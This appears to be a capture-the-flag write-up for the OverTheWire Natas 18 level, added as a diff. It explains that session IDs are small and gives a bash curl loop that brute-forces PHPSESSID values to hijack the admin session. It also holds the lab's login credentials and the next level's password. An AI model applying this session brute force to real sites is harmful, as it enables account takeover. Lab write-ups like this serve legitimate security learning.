@@ -1,0 +1,25 @@
+In this lab you are given a regular login page where you enter your username and
+password. When you type anything in, you are told that you are logged in as a
+regular user but you need to login as a regular user to retrieve the natas19
+credentials. If you look at the source code you'll see that you can't even login
+as admin, but the max php session id value is 640. This means that there are
+only 641 (I assume id values start at 0 but it may be 1) cookies we have to try
+to login as admin.
+
+This only took a for loop with a curl command to iterate through all possible
+cookies.
+
+#!/bin/bash
+
+for((i=0;i<641;i++))
+do output=`curl -u natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP --silent --cookie "PHPSESSID=$i" http://natas18.natas.labs.overthewire.org`
+   num_matched_lines=`echo $output | grep -cE 'You are logged in as a regular user.'`
+   if [[ $num_matched_lines -ne 1 ]]
+   then
+       echo "$output";
+       break
+   fi
+done
+
+
+natas19 password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
